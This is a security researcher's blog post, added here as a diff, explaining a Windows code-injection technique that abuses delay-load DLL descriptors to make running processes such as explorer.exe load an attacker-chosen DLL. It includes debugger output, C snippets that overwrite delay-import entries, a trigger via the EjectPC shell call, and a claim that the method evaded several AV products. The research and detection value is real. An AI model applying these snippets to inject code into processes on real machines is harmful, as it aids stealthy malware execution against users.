@@ -1,0 +1,771 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Abusing delay load DLLs for remote code injection - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="I always tell myself that I&rsquo;ll try posting more frequently on my blog, and yet
+here I am, two years later. Perhaps this post will provide the &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Abusing Delay Load DLLs for Remote Code Injection</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-09-19T14:00:00-07:00" pubdate data-updated="true">Sep 19<span>th</span>, 2017</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>I always tell myself that I&rsquo;ll try posting more frequently on my blog, and yet
+here I am, two years later.  Perhaps this post will provide the necessary
+motiviation to conduct more public research.  I do love it.</p>
+
+<p>This post details a novel remote code injection technique I discovered while
+playing around with delay loading DLLs.  It allows for the injection of
+arbitrary code into arbitrary remote, running processes, provided that they
+implement the abused functionality.  To make it abundantly clear, this is not
+an exploit, it&rsquo;s simply another strategy for migrating into other processes.</p>
+
+<p>Modern code injection techniques typically rely on a variation of two different
+win32 API calls: CreateRemoteThread and NtQueueApc.  Endgame recently put out a
+great article[0] detailing ten various methods of process injection.  While not
+all of them allow for injection into remote processes, particularly those
+already running, it does detail the most common, public variations.  This
+strategy is more akin to inline hooking, though we&rsquo;re not touching the IAT
+and we don&rsquo;t require our code to already be in the process.  There are no calls
+to NtQueueApc or CreateRemoteThread, and no need for thread or process
+suspension.  There are some limitations, as with anything, which I&rsquo;ll detail
+below.</p>
+
+<h2>Delay Load DLL</h2>
+
+<p>Delay loading is a linker strategy that allows for the lazy loading of DLLs.
+Executables commonly load all necessary dynamically linked libraries at runtime
+and perform the IAT fix-ups then.  Delay loading, however, allows for
+these libraries to be lazy loaded at call time, supported by a pseudo IAT
+that&rsquo;s fixed-up on first call.  This process can be better illuminated by the
+following, decades old figure below:</p>
+
+<p><img src="/images/posts/2017/delay.gif"></p>
+
+<p>This image comes from a great Microsoft article released in 1998 [1] that
+describes the strategy quite well, but I&rsquo;ll attempt to distill it here.</p>
+
+<p>Portable executables contain a data directory named
+<code>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</code>, which you can see using <code>dumpbin /imports</code>
+or using windbg.  The structure of this entry is described in delayhlp.cpp,
+included with the WinSDK:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>struct InternalImgDelayDescr {
+</span><span class='line'>    DWORD           grAttrs;        // attributes
+</span><span class='line'>    LPCSTR          szName;         // pointer to dll name
+</span><span class='line'>    HMODULE *       phmod;          // address of module handle
+</span><span class='line'>    PImgThunkData   pIAT;           // address of the IAT
+</span><span class='line'>    PCImgThunkData  pINT;           // address of the INT
+</span><span class='line'>    PCImgThunkData  pBoundIAT;      // address of the optional bound IAT
+</span><span class='line'>    PCImgThunkData  pUnloadIAT;     // address of optional copy of original IAT
+</span><span class='line'>    DWORD           dwTimeStamp;    // 0 if not bound,
+</span><span class='line'>                                    // O.W. date/time stamp of DLL bound to (Old BIND)
+</span><span class='line'>    };</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The table itself contains RVAs, not pointers.  We can find the delay directory
+offset by parsing the file header:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:022&gt; lm m explorer
+</span><span class='line'>start    end        module name
+</span><span class='line'>00690000 00969000   explorer   (pdb symbols)          
+</span><span class='line'>0:022&gt; !dh 00690000 -f
+</span><span class='line'>
+</span><span class='line'>File Type: EXECUTABLE IMAGE
+</span><span class='line'>FILE HEADER VALUES
+</span><span class='line'>
+</span><span class='line'>[...] 
+</span><span class='line'>
+</span><span class='line'>   68A80 [      40] address [size] of Load Configuration Directory
+</span><span class='line'>       0 [       0] address [size] of Bound Import Directory
+</span><span class='line'>    1000 [     D98] address [size] of Import Address Table Directory
+</span><span class='line'>   AC670 [     140] address [size] of Delay Import Directory
+</span><span class='line'>       0 [       0] address [size] of COR20 Header Directory
+</span><span class='line'>       0 [       0] address [size] of Reserved Directory</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The first entry and it&rsquo;s delay linked DLL can be seen in the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:022&gt; dd 00690000+ac670 l8
+</span><span class='line'>0073c670  00000001 000ac7b0 000b24d8 000b1000
+</span><span class='line'>0073c680  000ac8cc 00000000 00000000 00000000
+</span><span class='line'>0:022&gt; da 00690000+000ac7b0 
+</span><span class='line'>0073c7b0  "WINMM.dll"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This means that WINMM is dynamically linked to explorer.exe, but delay loaded,
+and will not be loaded into the process until the imported function is invoked.
+Once loaded, a helper function fixes up the psuedo IAT by using GetProcAddress
+to locate the desired function and patching the table at runtime.</p>
+
+<p>The pseudo IAT referenced is separate from the standard PE IAT; this IAT
+is specifically for the delay load functions, and is referenced from the delay
+descriptor.  So for example, in WINMM.dll&rsquo;s case, the pseudo IAT for WINMM is
+at RVA 000b1000.  The second delay descriptor entry would have a separate RVA
+for its pseudo IAT, and so on and so forth.</p>
+
+<p>Using WINMM as our delay example, explorer imports one function from it, <code>PlaySoundW</code>.
+In my particular running instance, it has not been invoked, so the pseudo IAT
+has not been fixed up yet.  We can see this by dumping it&rsquo;s pseudo IAT entry:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:022&gt; dps 00690000+000b1000 l2
+</span><span class='line'>00741000  006dd0ac explorer!_imp_load__PlaySoundW
+</span><span class='line'>00741004  00000000</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Each DLL entry is null terminated.  The above pointer shows us that the existing
+entry is merely a springboard thunk within the Explorer process.  This takes
+us here:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:022&gt; u explorer!_imp_load__PlaySoundW
+</span><span class='line'>explorer!_imp_load__PlaySoundW:
+</span><span class='line'>006dd0ac b800107400      mov     eax,offset explorer!_imp__PlaySoundW (00741000)
+</span><span class='line'>006dd0b1 eb00            jmp     explorer!_tailMerge_WINMM_dll (006dd0b3)
+</span><span class='line'>explorer!_tailMerge_WINMM_dll:
+</span><span class='line'>006dd0b3 51              push    ecx
+</span><span class='line'>006dd0b4 52              push    edx
+</span><span class='line'>006dd0b5 50              push    eax
+</span><span class='line'>006dd0b6 6870c67300      push    offset explorer!_DELAY_IMPORT_DESCRIPTOR_WINMM_dll (0073c670)
+</span><span class='line'>006dd0bb e8296cfdff      call    explorer!__delayLoadHelper2 (006b3ce9)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The tailMerge function is a linker-generated stub that&rsquo;s compiled in per-DLL,
+not per function.  The <code>__delayLoadHelper2</code> function is the magic that
+handles the loading and patching of the pseudo IAT.  Documented in delayhlp.cpp,
+this function handles calling LoadLibrary/GetProcAddress and patching the
+pseudo IAT.  As a demonstration of how this looks, I compiled a binary that
+delay links dnslib.  Here&rsquo;s the process of resolution of
+DnsAcquireContextHandle:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:000&gt; dps 00060000+0001839c l2
+</span><span class='line'>0007839c  000618bd DelayTest!_imp_load_DnsAcquireContextHandle_W
+</span><span class='line'>000783a0  00000000
+</span><span class='line'>0:000&gt; bp DelayTest!__delayLoadHelper2
+</span><span class='line'>0:000&gt; g
+</span><span class='line'>ModLoad: 753e0000 7542c000   C:\Windows\system32\apphelp.dll
+</span><span class='line'>Breakpoint 0 hit
+</span><span class='line'>[...]
+</span><span class='line'>0:000&gt; dd esp+4 l1
+</span><span class='line'>0024f9f4  00075ffc
+</span><span class='line'>0:000&gt; dd 00075ffc l4
+</span><span class='line'>00075ffc  00000001 00010fb0 000183c8 0001839c
+</span><span class='line'>0:000&gt; da 00060000+00010fb0 
+</span><span class='line'>00070fb0  "DNSAPI.dll"
+</span><span class='line'>0:000&gt; pt
+</span><span class='line'>0:000&gt; dps 00060000+0001839c l2
+</span><span class='line'>0007839c  74dfd0fc DNSAPI!DnsAcquireContextHandle_W
+</span><span class='line'>000783a0  00000000</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now the pseudo IAT entry has been patched up and the correct function is
+invoked on subsequent calls.  This has the additional side effect of leaving
+the pseudo IAT as both executable and writable:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:011&gt; !vprot 00060000+0001839c
+</span><span class='line'>BaseAddress:       00371000
+</span><span class='line'>AllocationBase:    00060000
+</span><span class='line'>AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY</span></code></pre></td></tr></table></div></figure>
+
+
+<p>At this point, the DLL has been loaded into the process and the pseudo IAT
+patched up.  In another additional twist, not all functions are resolved on
+load, only the one that is invoked.  This leaves certain entries in the
+pseudo IAT in a mixed state:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>00741044  00726afa explorer!_imp_load__UnInitProcessPriv
+</span><span class='line'>00741048  7467f845 DUI70!InitThread
+</span><span class='line'>0074104c  00726b0f explorer!_imp_load__UnInitThread
+</span><span class='line'>00741050  74670728 DUI70!InitProcessPriv
+</span><span class='line'>0:022&gt; lm m DUI70
+</span><span class='line'>start    end        module name
+</span><span class='line'>74630000 746e2000   DUI70      (pdb symbols)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the above, two of the four functions are resolved and the DUI70.dll library
+is loaded into the process.  In each entry of the delay load descriptor, the
+structure referenced above maintains an RVA to the HMODULE.  If the module
+isn&rsquo;t loaded, it will be null.  So when a delayed function is invoked that&rsquo;s
+already loaded, the delay helper function will check it&rsquo;s entry to determine if
+a handle to it can be used:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>HMODULE hmod = *idd.phmod;
+</span><span class='line'>    if (hmod == 0) {
+</span><span class='line'>        if (__pfnDliNotifyHook2) {
+</span><span class='line'>            hmod = HMODULE(((*__pfnDliNotifyHook2)(dliNotePreLoadLibrary, &dli)));
+</span><span class='line'>            }
+</span><span class='line'>        if (hmod == 0) {
+</span><span class='line'>            hmod = ::LoadLibraryEx(dli.szDll, NULL, 0);
+</span><span class='line'>            }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>idd</code> structure is just an instance of the InternalImgDelayDescr described
+above and passed into the <code>__delayLoadHelper2</code> function from the linker
+tailMerge stub.  So if the module is already loaded, as referenced from delay
+entry, then it uses that handle instead.  It does NOT attempt to LoadLibrary
+irregardless of this value; this can be used to our advantage.</p>
+
+<p>Another note here is that the delay loader supports notification hooks.  There
+are six states we can hook into: processing start, pre load library, fail
+load library, pre GetProcAddress, fail GetProcAddress, and end processing.  You
+can see how the hooks are used in the above code sample.</p>
+
+<p>Finally, in addition to delay loading, the portable executable also supports
+delay library unloading.  It works pretty much how you&rsquo;d expect it, so we
+won&rsquo;t be touching on it here.</p>
+
+<h2>Limitations</h2>
+
+<p>Before detailing how we might abuse this (though it should be fairly obvious),
+it&rsquo;s important to note the limitations of this technique.  It is not completely
+portable, and using pure delay load functionality it cannot be made to be so.</p>
+
+<p>The glaring limitation is that the technique requires the remote process to be
+delay linked.  A brief crawl of some local processes on my host shows many
+Microsoft applications are: dwm, explorer, cmd.  Many non-Microsoft
+applications are as well, including Chrome.  It is additionally a well
+supported function of the portable executable, and exists today on modern
+systems.</p>
+
+<p>Another limitation is that, because at it&rsquo;s core it relies on LoadLibrary,
+there must exist a DLL on disk.  There is no way to LoadLibrary from memory
+(unless you use one of the countless techniques to do that, but none of which
+use LoadLibrary&hellip;).</p>
+
+<p>In addition to implementing the delay load, the remote process must implement
+functionality that can be triggered.  Instead of doing a CreateRemoteThread,
+SendNotifyMessage, or ResumeThread, we rely on the fetch to the pseudo IAT, and
+thus we must be able to trigger the remote process into performing this
+action/executing this function.  This is generally pretty easy if you&rsquo;re using
+the suspended process/new process strategy, but may not be trivial on running
+applications.</p>
+
+<p>Finally, any process that does not allow unsigned libraries to be loaded will
+block this technique.  This is controlled by ProcessSignaturePolicy and can be
+set with SetProcessMitigationPolicy[2]; it is unclear how many apps are using
+this at the moment, but Microsoft Edge was one of the first big products to be
+employing this policy.  This technique is also impacted by the
+ProcessImageLoadPolicy policy, which can be set to restrict loading of images
+from a UNC share.</p>
+
+<h2>Abuse</h2>
+
+<p>When discussing an ability to inject code into a process, there are three
+separate cases an attacker may consider, and some additional edge situations
+within remote processes.  Local process injection is simply the execution of
+shellcode/arbitrary code within the current process.  Suspended process is the
+act of spawning a new, suspended process from an existing, controlled one and
+injecting code into it.  This is a fairly common strategy to employ for
+migrating code, setting up backup connections, or establishing a known process
+state prior to injection.  The final case is the running remote process.</p>
+
+<p>The running remote process is an interesting case with several caveats that
+we&rsquo;ll explore below.  I won&rsquo;t detail suspended processes, as it&rsquo;s essentially
+the same as a running process, but easier.  It&rsquo;s easier because many
+applications actually just load the delay library at runtime, either because
+the functionality is environmentally keyed and required then, or because
+another loaded DLL is linked against it and requires it.  Refer to the source
+code for the project for an implementation of suspended process injection [3].</p>
+
+<h3>Local Process</h3>
+
+<p>The local process is the most simple and arguably the most useless for this
+strategy.  If we can inject and execute code in this manner, we might as well
+link against the library we want to use.  It serves as a fine introduction to
+the topic, though.</p>
+
+<p>The first thing we need to do is delay link the executable against something.
+For various reasons I originally chose <code>dnsapi.dll</code>.  You can specify delay
+load DLLs via the linker options for Visual Studio.</p>
+
+<p>With that, we need to obtain the RVA for the delay directory.  This can be
+accomplished with the following function:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>IMAGE_DELAYLOAD_DESCRIPTOR*
+</span><span class='line'>findDelayEntry(char *cDllName)
+</span><span class='line'>{
+</span><span class='line'>    PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
+</span><span class='line'>    PIMAGE_NT_HEADERS pImgNt = (PIMAGE_NT_HEADERS)((LPBYTE)pImgDos + pImgDos-&gt;e_lfanew);
+</span><span class='line'>    PIMAGE_DELAYLOAD_DESCRIPTOR pImgDelay = (PIMAGE_DELAYLOAD_DESCRIPTOR)((LPBYTE)pImgDos + 
+</span><span class='line'>            pImgNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress);
+</span><span class='line'>    DWORD dwBaseAddr = (DWORD)GetModuleHandle(NULL);
+</span><span class='line'>    IMAGE_DELAYLOAD_DESCRIPTOR *pImgResult = NULL;
+</span><span class='line'>
+</span><span class='line'>    // iterate over entries 
+</span><span class='line'>    for (IMAGE_DELAYLOAD_DESCRIPTOR* entry = pImgDelay; entry-&gt;ImportAddressTableRVA != NULL; entry++){
+</span><span class='line'>        char *_cDllName = (char*)(dwBaseAddr + entry-&gt;DllNameRVA);
+</span><span class='line'>        if (strcmp(_cDllName, cDllName) == 0){
+</span><span class='line'>            pImgResult = entry;
+</span><span class='line'>            break;
+</span><span class='line'>        }
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    return pImgResult;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Should be pretty clear what we&rsquo;re doing here.  Once we&rsquo;ve got the correct table
+entry, we need to mark the entry&rsquo;s DllName as writable, overwrite it with our
+custom DLL name, and restore the protection mask:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>IMAGE_DELAYLOAD_DESCRIPTOR *pImgDelayEntry = findDelayEntry("DNSAPI.dll");
+</span><span class='line'>DWORD dwEntryAddr = (DWORD)((DWORD)GetModuleHandle(NULL) + pImgDelayEntry-&gt;DllNameRVA);
+</span><span class='line'>VirtualProtect((LPVOID)dwEntryAddr, sizeof(DWORD), PAGE_READWRITE, &dwOldProtect);
+</span><span class='line'>WriteProcessMemory(GetCurrentProcess(), (LPVOID)dwEntryAddr, (LPVOID)ndll, strlen(ndll), &wroteBytes);
+</span><span class='line'>VirtualProtect((LPVOID)dwEntryAddr, sizeof(DWORD), dwOldProtect, &dwOldProtect);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now all that&rsquo;s left to do is trigger the targeted function.  Once triggered,
+the delay helper function will snag the DllName from the table entry and load
+the DLL via LoadLibrary.</p>
+
+<h3>Remote Process</h3>
+
+<p>The most interesting of cases is the running remote process.  For demonstration
+here, we&rsquo;ll be targeting explorer.exe, as we can almost always rely on it to be
+running on a workstation under the current user.</p>
+
+<p>With an open handle to the explorer process, we must perform the same
+searching tasks as we did for the local process, but this time in a remote
+process.  This is a little more cumbersome, but the code can be found in the
+project repository for reference[3].  We simply grab the remote PEB, parse the
+image and it&rsquo;s directories, and locate the appropriate delay entry we&rsquo;re
+targeting.</p>
+
+<p>This part is likely to prove the most unfriendly when attempting to port this
+to another process; what functionality are we targeting?  What function or
+delay load entry is generally unused, but triggerable from the current session?
+With explorer there are several options; it&rsquo;s delay linked against 9 different
+DLLs, each averaging 2-3 imported functions.  Thankfully one of the first
+functions I looked at was pretty straightforward: <code>CM_Request_Eject_PC</code>.  This
+function, exported by <code>CFGMGR32.dll</code>, requests that the system be ejected from
+the local docking station[4].  We can therefore assume that it&rsquo;s likely to be
+available and not fixed on workstations, and potentially unfixed on laptops,
+should the user never explicitly request the system to be ejected.</p>
+
+<p>When we request for the workstation to be ejected from the docking station, the
+function sends a PNP request.  We use the IShellDispatch object to execute
+this, which is accessed via Shell, handled by, you guessed it, explorer.</p>
+
+<p>The code for this is pretty simple:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>HRESULT hResult = S_FALSE;
+</span><span class='line'>IShellDispatch *pIShellDispatch = NULL;
+</span><span class='line'>
+</span><span class='line'>CoInitialize(NULL);
+</span><span class='line'>
+</span><span class='line'>hResult = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, 
+</span><span class='line'>                           IID_IShellDispatch, (void**)&pIShellDispatch);
+</span><span class='line'>if (SUCCEEDED(hResult))
+</span><span class='line'>{
+</span><span class='line'>    pIShellDispatch-&gt;EjectPC();
+</span><span class='line'>    pIShellDispatch-&gt;Release();
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>CoUninitialize();</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Our DLL only needs to export <code>CM_Request_Eject_PC</code> for us to not crash the
+process; we can either pass on the request to the real DLL, or simply ignore
+it.  This leads us to stable and reliable remote code injection.</p>
+
+<h3>Remote Process &ndash; All Fixed</h3>
+
+<p>One interesting edge case is a remote process that you want to inject into via
+delay loading, but all imported functions have been resolved in the pseudo IAT.
+This is a little more complicated, but all hope is not lost.</p>
+
+<p>Remember when I mentioned earlier that a handle to the delay load library is
+maintained in its descriptor?  This is the value that the helper function
+checks for to determine if it should reload the module or not; if it&rsquo;s null, it
+attempts to load it, if it&rsquo;s not, it uses that handle.  We can abuse this check
+by nulling out the module handle, thereby &ldquo;tricking&rdquo; the helper function into
+once again loading that descriptor&rsquo;s DLL.</p>
+
+<p>In the discussed case, however, the pseudo IAT is all patched up; no more
+trampolines into the delay load helper function.  Helpfully the pseudo IAT is
+writable by default, so we can simply patch in the trampoline function
+ourselves and have it instantiate the descriptor all over again.  In short,
+this worst-case strategy requires three separate WriteProcessMemory calls: one
+to null out the module handle, one to overwrite the pseudo IAT entry, and one
+to overwrite the loaded DLL name.</p>
+
+<h3>Conclusions</h3>
+
+<p>I should make mention that I tested this strategy across several next gen
+AV/HIPS appliances, which will go unnamed here, and none where able to detect
+the cross process injection strategy.  It would seem overall to be an
+interesting challenge at detection; in remote processes, the strategy uses the
+following chain of calls:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>OpenProcess(..);
+</span><span class='line'>
+</span><span class='line'>ReadRemoteProcess(..); // read image
+</span><span class='line'>ReadRemoteProcess(..); // read delay table 
+</span><span class='line'>ReadRemoteProcess(..); // read delay entry 1...n
+</span><span class='line'>
+</span><span class='line'>VirtualProtectEx(..);
+</span><span class='line'>WriteRemoteProcess(..);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s it.  The trigger functionality would be dynamic among each process, and
+the loaded library would be loaded via supported and well-known Windows
+facilities.  I checked out a few other core Windows applications, and they all
+have pretty straightforward trigger strategies.</p>
+
+<p>The referenced project[3] includes both x86 and x64 support, and has been
+tested across Windows 7, 8.1, and 10.  It includes three functions of interest:
+inject_local, inject_suspended, and inject_explorer.  It expects to find
+the DLL at <code>C:\Windows\Temp\TestDLL.dll</code>, but this can obviously be changed.
+Note that it isn&rsquo;t production quality; beware, here be dragons.</p>
+
+<p><em>Special thanks to Stephen Breen for reviewing this post</em></p>
+
+<h2>References</h2>
+
+<p>[0]
+<a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a> <br/>
+[1] <a href="https://www.microsoft.com/msj/1298/hood/hood1298.aspx">https://www.microsoft.com/msj/1298/hood/hood1298.aspx</a> <br/>
+[2]
+<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088">https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088</a>(v=vs.85).aspx <br/>
+[3] <a href="https://github.com/hatRiot/DelayLoadInject">https://github.com/hatRiot/DelayLoadInject</a>  <br/>
+[4]
+<a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811">https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811</a>(v=vs.85).aspx</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-09-19T14:00:00-07:00" pubdate data-updated="true">Sep 19<span>th</span>, 2017</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/code-injection/'>code injection</a>, <a class='category' href='/blog/categories/windows/'>windows</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll/" data-via="" data-counturl="http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/06/ntpdc-exploit/" title="Previous Post: ntpdc local buffer overflow">&laquo; ntpdc local buffer overflow</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/" title="Next Post: Dell SupportAssist Driver - Local Privilege Escalation">Dell SupportAssist Driver - Local Privilege Escalation &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
